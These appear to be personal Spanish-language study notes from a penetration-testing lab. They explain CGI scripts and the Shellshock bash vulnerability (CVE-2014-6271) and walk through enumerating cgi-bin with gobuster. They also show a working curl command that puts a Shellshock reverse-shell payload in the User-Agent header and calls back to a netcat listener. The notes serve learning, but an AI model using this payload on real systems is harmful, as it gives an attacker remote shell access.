
*HAY UN MODULO EN MSF*


CGI ayuda al servidor a renderizar paginas dinamicas y crear una respuesta personalizada para el usuario que realiza la solicitud 

Se suelen usar para acceder a otras aplicaciones que se ejecutan en un servidor web actuando como middleware

Los directorios donde suelen estar son:

	/CGI-bin/
	/cgi/

Se suelen usar porque:

- El servidor debe interactuar dinamicamente con el usuario
- El usuario envia datos web rellenando un formulario. La aplicacion CGI procesa los datos y devuelve el resultado

Pasos:

- Se crea un directorio con scripts cgi 
- El usuario realiza una solicitud a traves de URL a un script cgi como `https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl`
- El servidor ejecuta el script y devuelve la salida al cliente


## Ataques CGI

#### Shellshock ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) - Linux

Shellshock permite vulnerar versiones antiguas de bash que guardaban incorrectamente las variables del entorno

#### Ejemplo practico

1. Buscamos scripts cgi

```
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
![[Pasted image 20260728145735.png]]


2. Si hacemos una peticion al cgi vemos que no nos devuleve nada. Puede que este en desuso:

![[Pasted image 20260728145815.png]]


3. Vamos a confirmar la vuln. Enviamos a traves de curl o Burp hacemos un fuzzing de user-agent:

![[Pasted image 20260728145932.png]]


4. Ahora hacemos una explotacion para obtener una reverse shell

- Creamos el listener

```
sudo nc -lvnp 7777
```

- Enviamos una solicitud con el payload en el parametro User-Agent:

```
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```
![[Pasted image 20260728150040.png]]

- Obtenemos la shell:

![[Pasted image 20260728150052.png]]


## Ejemplo practico

Enumera el host, explota shellshock y sube la flag localizada en el servidor

1. Hacemos un fuzzing para encontrar scripts cgi

![[Pasted image 20260728150339.png]]

2. Accedemos al encontrado y no nos devueleve nada por lo que vamos a probar shellshock modificando el user agent desde burp

![[Pasted image 20260728150353.png]]

![[Pasted image 20260728150402.png]]

3. Mandamos la solicitud al repeater

![[Pasted image 20260728150419.png]]

4. Abrimos un listener, ponemos el payload de reverse shell en user agent y al enviarlo obtenermos la shell. Obtenemos la flag

![[Pasted image 20260728150623.png]]
![[Pasted image 20260728150616.png]]![[Pasted image 20260728150644.png]]